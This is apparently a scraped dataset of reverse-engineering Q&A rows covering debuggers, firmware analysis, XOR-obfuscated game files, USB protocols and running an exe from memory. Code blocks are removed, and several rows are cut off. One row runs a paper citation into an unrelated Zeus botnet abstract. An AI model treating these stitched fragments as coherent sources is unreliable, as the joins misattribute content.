","I'm having trouble debugging a win32 executable file under Windows 7. I've tried using ollyDbg and : the former simply does nothing, while the latter complains with an ""Error starting process (invalid pe?)!"" message. I think this might have to do with the fact that said executable is digitally signed. I did some quick research and  came up, where I learned that digital signatures in windows executables are referenced in the file's PE header, which I think might be what x64dbg was complaining about. The executable I'm talking about is the Mumble windows client version 1.2.10. It is the only executable signed with two different digital signatures, which further reinforces my hypothesis. Sadly, even after stripping the digital signatures using the delcert.exe linked in the SO question above, the problem remains which brings me to a dead end. Is it possible digital signatures are messing these debuggers up? Is it possible that the signature stripping tool doesn't produce a valid pe file for the debuggers I tried? What else could I be doing wrong? As a footnote: I know mumble is free software and I could just compile my own version, but this is Reverse Engineering, right?

The next step has been to try to identify the key being used to decrypt with, the issue is that the assembly for the individual block cipher encryption is about 2.5MB in size. However, what I have observed is that it is all of a very similar form, for example, a snippet: {code-blk}). My current hunch is that this may be an AES-128 implementation with unrolled rounds.

","I'm new to using x32/64dbg and I have an EXE with PDB symbols and want to disassemble and debug an unmanaged function call. It's from an x86 .NET 2.0 DLL where the unmanaged code sits compiled inside the EXE.

","Essentially, I'm looking for a tool that could reconstruct pseudocode with conditional operators, loops, break/continue, etc. from assembly language code for an arbitrary CPU, given only a limited understanding of the assembly constructs related to control flow, and taking anything that it doesn't understand as opaque blobs. Alternatively, it wouldn't need to understand any assembly if it could take pseudocode ""if (condition) goto label"" and ""goto label"" as basic block boundaries. For example, {code-blk} are ""too large"". Also, the variables A to F don't have to follow any addressing mode conventions, they can be arbitrary strings, reproduced literally in the output. The tool doesn't need to know anything but how the labels look like, and the style of the comparison operators and the branches (one comparison instruction produces condition codes consumed by various branch instructions, vs. various comparison instructions produce a true/false value in a register, consumed by ""branch if true"" and ""branch if false"" instructions, etc). Things become somewhat nontrivial when these structures are nested, labels are reused, break/continue were used in the source code, incidental non-structured control transfers may occur, and so on. Switch/case statements are separate story. To recognize them adequately, a deeper understanding of the underlying ISA is needed.

","So I recently read [1] which evaluates several disassemblers. The truth/test binaries are generated by the SPEC CPU 2006 Benchmark suite. The authors provide detailed build instructions for the ELF set inside a VirtualBox. However, reconstructing the Windows binaries seems impossible for me, as the authors didn't provide the SPEC configuration files for building those binaries. So building the binaries with Visual Studio 2015, which actually match with the provided mapping files [2] didn't work (bruteforcing/guessing the compilation settings). For example, most of the samples ""SPEC/vs15-32/C++"" and ""SPEC/vs15-32/C"" have the following prologue of the .text base (see appendix for properties description): {code-blk} [1] An In-Depth Analysis of Disassembly on Full-Scale x86/x64 Binaries by Dennis Andriesse: Zeus is a family of credential-stealing trojans which originally appeared in 2007. The first two variants of Zeus are based on centralized command servers. These command servers are now routinely tracked and blocked by the security community. In an apparent effort to withstand these routine countermeasures, the second version of Zeus was forked into a peer-to-peer variant in September 2011. Compared to earlier versions of Zeus, this peer-to-peer variant is fundamentally more difficult to disable. Through a detailed analysis of this new Zeus variant, we demonstrate the high resilience of state of the art peer-to-peer botnets in general, and of peer-to-peer Zeus in particular.",426,378,1,True

","I have a Chinese USB gaming mouse (04d9:a070) which has 4 color modes and 4 light levels. I know for a fact that this mouse is capable for showing at least 5 different color so it must be an RGB led (4 legs). The software is the worst I've ever seen and it's incredibly hard to change the color, brightness and mode so it works and doesn't just turn off. Now I'm planning to make my own control software (for Linux first). I have started with a simple guide ""Reverse Engineering a USB mouse (Updated 3rd May 2017)"" at Bytepunk (can't post a link but Google or DuckDuckGo should find that guide) I have already sniffed most of the things I need. I used USBlyzer on Windows with the awful control software and got a few hex strings and figured out how to change the color, brightness and mode in the hex strings. I pasted the data I discovered (Pastebin) {code-blk} I'm new to serial communications and reverse engineering so I don't know what to search for. I think I can post pictures and more data from the USBlyzer in the comments. This is my first post here so I don't have the reputation to give more links. Greetings, Santeri",216,298,2,True

","I am trying to disassemble the firmware for the Cisco Sx300 switch as found here: While some documentation for other iterations of Wind River's firmware exist, I have not encountered a working set of tools for this particular firmware. Binwalk gives some results: {code-blk} However, extraction with the -e flag doesn't provide meaningful results. Several files are extracted, but others end up as corrupt archives, or file that are are too small to be actual files. I am not certain that the LZMA compressed data isn't false positive. Disassembly with IDA fails, as I do not know the loader address. This Cisco help resource suggests that there is some form of compression going on: This help support post confirms that the Firmware is ARM based, but I am not certain as to the exact make of the chip. I am aware that previous iterations of the VxWork's Firmware had the loader address in the header. Analysis of the header did not find a useable address at the suggested location (0x14) I attempted to match up the strings in the firmware to string tables and was not able to find any string tables, despite a thorough search. This supports my notion that it is compressed, or otherwise packed. Lastly, I searched through the binary for probable addresses in order to deduce the loader address. I was not able to find any commonly referenced addresses or ranges. This was especially hard, as none of the binary was able to be correctly analyzed by IDA. Am I missing something easy and fundamental here? Is there a special technique for VxWorks firmware?",388,362,1,True

","As asking a friend and no amount of Googling yielded an answer, I figured I'd make an account and give this place a go. I'm working on reverse engineering the server for a relatively old game with no network packets from when it was alive. The game only made partial use of SSL (don't know what for specifically), and nothing I send it seems to trigger any response. The game sends a packet via a TCP PSH after the connection is established, and Apache replies with a 400 Bad Request. If Apache doesn't send any error, the game will wait indefinitely for a response. Due to lack of environment variables in the data and a defining request (HTTP GET, SSL handshake, etc.) from the game, it's unclear as to what it's expecting. CGI scrips, digest authentication, nor anything I can think of matches the contents. Here's the packet dump.

","I am reverse-engineering an 8051 architecture program of a specific chip. The disassembly naturally doesn't contain any function names, and the register names are minimal. For example, address 0xb3 is a specific register with the name ""RTC2CON"". since the register name is specific for the chip the disassembly doesn't show it but rather ""0xb3"". My question is how can I set a rule that will replace every occurrence of a certain string in the disassembly (in this case 0xb3) with another string (the register name RTC2CON). Another Example {code-blk} To be more clear the chip is the nRF24LE1. In this example there is a manipulation on the special function register on adress 0xe8 (RFCON) Bit 1 is firstly cleared, and after some operation it is set again. What I want is simply that the dissasembly will display RFCON.1 instead of 0xe8.1 Another problem I have is with a function that is called using ljmp instead of lcall. When I try to rename that function with afn the new name goes instead to the function calling it with ljmp. The function called has 58 XREFS and therefore it is very important to me to see it's name and not it's address when it is called. (functions default name is their fcn.address).",178,339,1,True

","I'm trying to reverse the BIOS of a machine to learn something. The bigger problem I'm facing is that during early initialization, the code is making heavy usage of MSRs, and most of the time, I found those not documented. In a specific point of this BIOS, as an example, I found this function: {code-blk} Looking thorough the Intel 64 and IA-32 Architectures Software Developer’s Manual Volume 4: Model-Specific Registers I found no evidence this 0x1fc register existence for Haswell, Broadwell or IvyBridge this BIOS is for. Instead few documentation on this register exists for different Intel versions: for Goldmont, Nehalem, the register is named MSR_POWER_CTL and only bit #1 is documented for Sandy Bridge is still named MSR_POWER_CTL but no further info are provided, instead it just says refer to , where nothing useful was found. for Skylake, Kaby Lake, Coffee Lake and Cannon Lake datasheet is more verbose; is still named MSR_POWER_CTL and the there bits: #1, #20 and #21 descriptions appears, still no evidences for bits #0 and #21 used in this function. So my question: If anyone has info on the register I've mentioned, that would be nice if he/her wants to share with me; more important, I would appreciate if anyone would direct me on a reliable source of info on this topic other than Intel official manuals.",343,335,2,True

This is an iOS application found on the App Store and has some anti-debugging capabilities built in it.

As you can see, I did a register read of both w8 and X8. In theory, based on the memory contents of X8, this instruction should have loaded 0xff into w8 through the assembly instruction ldrb w8, [x8] Problem Faced: Upon evaluation of the instruction the actual memory contents in w8 was 0xfe and NOT 0xff. This is really an unexpected behaviour as my ARM knowledge tells me that the correct value for that evaluation should be 0xff and not 0xfe. Things I have tried  but failed to explain this behaviour Creating mini Xcode iOS app and trying to replicate the same instruction set and memory state Setting watchpoints to observe if any part of the program is editing the memory in-between Looking for memory protections such as mprotect if they have modified that memory region I would be highly appreciative of anyone who can point me in any right direction or ways so that I can better understand this mysterious behaviour.

","I am trying to port Enrique Nissim's script from his presentation ""Reverse Engineering and Bug Hunting on KMDF Drivers"" to IDA 7.4. His original script can be found at: My somewhat updated version can be found at: While I have eliminated most of the errors, I noticed that on all of the drivers I tried it on some of the constants fail to be added to the IDA database. Errors like these propagate upon running the script: {code-blk} The big question for me is why is this type import failing? Is it because the types already exist, or is there some subtle syntax error here? Is the flag parameter here mandatory? The error and documentation make is very difficult to tell exactly what's going on here. The reason why I care is I believe that the failing imports are contributing to the driver failing to find IoControlls, driver major functions, and other important structures for reverse engineering KMDF drivers. Here are my main theories for why this is happening: Somehow the behavior of import_type doesn't exactly work closely enough to the original Til2Idb method that was in the original script. The types are somehow are already in the database in some conflicting way due to flirt signatures or something. I tried looking for them manually, but I don't see them being added on any of the drivers I have tried with the script. This is IDA telling me that the constants cant be added because they don't exist in the database and the script is functioning more or less as intended. If this is cases I wish the IDA docs would give me some indication of this behavior. I hope this makes the question clear guys. I hope you can help!

","Data Interleaving is a term I made up to reflect an idea I've been contemplating lately; interleaving the bits of a set of variables into a single binary blob. Any number and types of variables could be interleaved together. Access to variables in the interleaved blob can even be on-demand, with a controller class encoding or decoding variables on the fly. What in the World? Data Interleaving is the process of translating any number of variables to a single binary blob by interleaving the bits of the variables. This obfuscates the variables in memory or external storage. The entire blob need not be decoded to access member variables, though it can be for improved performance. Why? This will help complicate reverse engineering of code. It will particularly deter identifying data types and variables. Plaintext is also well obfuscated with this interleave. Interleave Map The variables to be encoded could be defined by an array of byte sizes of those variables and, optionally, pointers to a location in memory to retrieve or store their reconstituted form. In the case of on-demand access to an interleaved blob, individual variables can be decoded and re-encoded on the fly, so buffers for reconstituted storage are optional (though they may be temporarily reconstituted by the controller class as members are modified). The members of the bitwise interleave can be referenced in the source code via their indices. For instance, index 0 may be MY_VARIABLE_INSTANCE. By passing the variable index to an interleave blob controller class, it knows the size and, optionally, a pointer for constituted storage. Member data types can be anything. They need not be similar. When one variable ends, it is simply ended. See a few paragraphs below for what happens when a single variable is longer than the others. {code-blk}",332,459,1,True

So, in its initial state (after reset) the processor starts in a mode called , in this mode, segmentation is enabled by default to support legacy software. During the boot process of the operating system, the processor is changed into , and then in enabled paging. Before paging, the segment registers were used like this In real mode each logical address points directly into physical memory location, every logical address consists of two 16 bit parts: The segment part of the logical address contains the base address of a segment with a granularity of 16 bytes, i.e. a segments may start at physical address 0, 16, 32, ..., 220-16. The offset part of the logical address contains an offset inside the segment, i.e. the physical address can be calculated as {code-blk} register to access the TLS (thread local storage) and in Linux it's for accessing cpu specific memory. User perspective: From the user perspective, in recent operating system that uses paging, the memory works in so called ""flat mode"". Every process access its own memory (4GB) in linear fashion, so basically the segment registers are not needed. They are still registers, so they can of course be used for various other assembly operations.",52,382,2,True

","It's certainly not a well known format. A quick glance at the file with a hex viewer shows that it mainly consists of records that all have similar, but not identical, size and layout; the very end of the file seems to be something different. The first 2 Bytes - 047E - seem to be the number of records (1150). Each of the records seems to start with 7 strings that, in most cases, denote a country, adjective for the country, capital, and team name - i'd guess the save file is from a soccer game or similar. For example, one of the record starts at {code-blk} for 67 teams. You could now proceed to compare this to what happens when you load the save file into the game; is there anything that's special for exactly 16, or 67, of these 1150 teams? You could also look for the teams that have these values, and check what's special for these exact teams. Investing a lot of time into this will possibly allow you to identify most bytes without actually decompiling the application. However, i'd expect you can identify only a few of the values this way, and you will need to do what Jason suggested if you really want to understand everything.

","These files are definitely not compressed. behavior_trees.dat is a binary file which is not encrypted and not compressed, just binary. Encryption, as far as I can see, looks like substitution cipher which should be relatively easy to crack with frequency analysis if you know what should be there. Assuming that decrypted content of files from older and newer versions are similar you can try to account frequencies of symbols on a base of files of previous versions. Here is what I'd do for decrypting (for example) assembly.dat file: Get a corresponding file from previous version which should be not encrypted. Account frequency of appearance of each symbol (should be easily done with simple python script) Account frequency of appearance of each symbol in newer version files. Try to replace symbols from the newer files to the symbols with same (or alike) appearance rate from the older file and see what happends. UPDATE, Just for the sake of completeness: I used an excellent tool  by Didier Stevens (it was mentioned by @Andy Dove in answer to another question, which reminded me to return to this one) and found out the following: Assuming that the decrypted content of current file is similar to content of previous I tried to find some words from the picture you provided with this tool (for example words like item, Pickup and Physical) . The tool shows that it is xor substitution cipher, the key is 0x2a, applying it to word filter  and lang int files gives reasonable result. Applying this key gives a lot of reasonable strings, for all files I tried the key was the same. According to your claim you know some basics in programming. Which means that you'll be able to run the following python script on your files and understand what happens or translate it to the language of your choice. Good luck. {code-blk}",94,425,1,True

This means that whenever the software being emulated accesses hardware, it won't work in Unicorn in the same way as on actual hardware. We have several questions about emulating firmware on QEMU. The general answer is that, when you try booting a firmware kernel in QEMU, that kernel will access some I/O ports, but in the emulated environment, those I/O ports won't react in the way they should. For example, an input bit that signals ""device ready"" will be stuck in one state, instead of toggling between true and false.

","First of all, I would advise you to read about the SystemV ABI for i386 and amd64. You can find the documents here: These documents define as precisely as possible how a compiler coder should translate some C/C++ code into i386/amd64 assembly code for a Unix-like system. They are extremely important documents and you should refer to it as often as possible because they contain a lot of answers for most of your questions. Now, back to your original question, in your case the main differences between the two codes is that {code-blk} and the automatic variables below (we say automatic variable for the variable which are within the function's scope). Of course, these data movements are totally unnecessary, but the compiler just apply a default template for starting a function which transfer a copy of the arguments in the local memory stack-frame. And, once again, when the compiler realize that these variables are of no use, then these moves will disappear.",115,216,1,True

","Well for starters you are going to want an in Kernel USB monitor like Linux has, a pass through USB analyzer (more expensive, but more flexible) or something like a logic analyzer. Here is a video that goes into great detail of doing the latter far more than anyone will here  Note from the video To summarize you'll need a logic analyzer, potentially a way of getting the device to tell you it is about to send a packet in some manner (otherwise you will have better luck with a USB analyzer or in kernel USB monitor). Sigrok is software used there... but there are others. Here is a little python code the guy in the video uses which will probably be of use to you. Which is just a basic example of using pyusb he was using it to talk to whatever micro controller board he was debugging you could use it to talk to your FPGA perhaps as you figure out what it's protocol is doing. {code-blk} The method you choose largely depends on what you need to know, if the device is functioning properly and you don't need to make changes to it, perhaps a software monitor is good enough. If it is indeed USB serial is it a dedicated chip? If so find it's datasheet... and investigate the circuit that may tell you some things. Common USB to serial chips are the the following which either use a standard USB CDC ACM protocol (check if chip in question is this then you can just grap the spec for it here ) or custom driver. Note that the USB end of the protocol itself is probably baud rate independent but you may need to tell the USB serial convert what rate to run at... it depends alot on how it was designed. Probing the Uart output pints of the controller would allow you to figure out the correct baud rate if you can't figure it out from the circuit itself. Another way to go about this would be to figure out at least one command that will give you a response... then exhaustively try different baud rates and configurations until you get the expected response.

In some operating systems or programming languages, the initial entry is not part of the program but of the runtime library, in which case the runtime library initializes the program and then the runtime library enters the program. In other cases, the program may call the runtime library before doing anything when it is entered for the first time, and, after the runtime library returns, the actual code of the program begins to execute.

","COM is very abstract idea in Object Oriented Programming (OOP). To understand this well, you need some in-depth knowledge of , ,  and . Those subroutines are part of a COM Proxy/Stub DLL. Proxy DLL are used when the COM interfaces are defined/implemented in separate DLL files. Think these as a simple function call but with COM virtual tables. In case of dynamic linking, DLL has exported functions and EXE files call them. In case of proxy/stub COM, the underlying functions are defined in a separate DLL files. When an executable call any method the parameters are marshalled (i.e. packed/assembled) through Proxy DLL to the main DLL where all the real things happens. Proxy DLLs contain just the list of those methods, aka. Virtual Functions in Virtual Method Table (vtable or vtbl). So, the ""ObjectStublessClient"" are the virtual functions only. In simple C language, this can be compared as function pointers in a structure (with oversimplification). In IDA, go to View --> Open subviews --> Names or press Shift + F4 to open 'Names Window'. Search for 'ProxyVtbl', you can find defined virtual tables. Here is an example of  in Ole32.DLL file. In IDA assembly view: {code-blk} because Windows binary generally use that calling conventions.

","As explained  for a similar problem, facing an unknown Frame Check Sequence, the first thing should be to determine if it is an affine function of the frame data, for the sense that has in cryptography. This can be defined by the property: For any set with an odd number of frames of equal length, the XOR of the Frame Check Sequences for these frames is also the FCS for the (often, other) frame obtained by XOR-ing the data portion of the frames in the set. All CRCs are affine (including non-standard variations); secure cryptographic hashes and Message Authentication Codes are not. There is evidence that indeed that FCS is affine: it is easy to isolate blocks of four (or larger even number) of different lines such that one is the XOR of the others, and that allows prediction of the last two bytes for most lines. Two examples: {code-blk}. One possibility is that this FCS is one of countless failed attempts to implement CRC-16-CCITT; though one that went unusually out of track, in a way that still puzzles me. I'm tempted to incriminate a partial or misaligned capture, but that tends to conflicts with the statement: When I 'replay' the collected messages the lamp reacts as expected. More samples might help. Perhaps, put this into a  linked in the question or a comment. Perhaps, give settings of the  device and/or software used for the capture.",472,339,1,True

","The protocol spec clearly does not apply to your device, so don't bother trying to use its checksum calculation. However it may be similar enough to provide some clues to the actual protocol. The protocol should include some method of synchronizing the serial data stream. In the (incorrect) spec this could be done using the high nibbles (8,9,A,B) that all have bit 7 set. In your data only bytes A7 and B7 have bit 7 set, which suggests that this bit is used for synchronization. Bytes A4-A6 and B4-B6 appear to be digit and flag data. Bytes A2 and B2 match the fixed value for {code-blk} The first 11 lines in your data dump all have unique 'checksums'. Looking good so far! The next 9 lines are not so good, as they have many duplicate values. However I have not attempted to calculate checksums of address and data bytes. Depending on the algorithm used, some lines may be expected to produce the same checksum. For a thorough analysis I would capture more data with as many different digit and flag combinations as possible, then write a program to create checksums with various algorithms until one matches the bits in A7 and B7.",234,281,1,True

","This is an interesting problem where some issues have to be solved. For the first part of your question: How to run an exe from memory, you might want to consult the following link: In the following, I will try to show you how to tackle your second question, how to call a class method of that exe being present in memory. The following example (keep it as simple as possible) does not assume a DLL as a caller, but another exe. The mechanics should be exactly the same, however. Part 1 : Called exe Let us start with a very simple C++ Windows (VS2013) exe serving as the one to be called from another exe (or DLL in your case). I named this exe ""ExeToBeCalled"". {code-blk} It has to be noted that our test exe from part 1 has to be compiled in Debug instead of Release mode. It is too simple for the compiler which optimizes it and does not even bother to call the myFunc, but directly calculates the result. To summarize, for the solution of your problem the following must be assumed or known: The address of the class method. We assumed a static address which need not to be the case in general. ""Static Address"" here means a constant offset (RVA) of the exe's start address obtained by LoadLibrary, which usually differs on every load (ASLR). The way the compiler of the exe used to call a method of a class. Here we assumed the passing of the ""this"" pointer in the ecx register. The memory location where the result of the method call is stored. This also can be arbitrarily complicated in general, in our demo the simplest possible memory layout turned out to be correct. In one of the comments the question about 64Bit has been asked. Of course, there the situation might be different, the method to investigate the problem would be rather similar. I hope this little example could enlighten one method how to attack your problem.",167,450,1,True

","I don't understand why they would be actually wrong compilers convert high level code in human readable form (like {code-blk} The program is compiled without optimizations, and you can see that the information related is permanently lost (although, you can try to predict the array based on stack size, but it is impossible to conclude that it is indeed an array). Does decompilation not really work if you are starting from hand-written assembly? It may or may not. If a binary is compiled using standard compiler like gcc or llvm, then such compilers use certain format (calling conventions, optimization or code representation style, etc.). But in handwritten assembly, you can essentially do anything (use custom format, different calling conventions, etc). Thus, it is hard to predict the intension of the programmer.
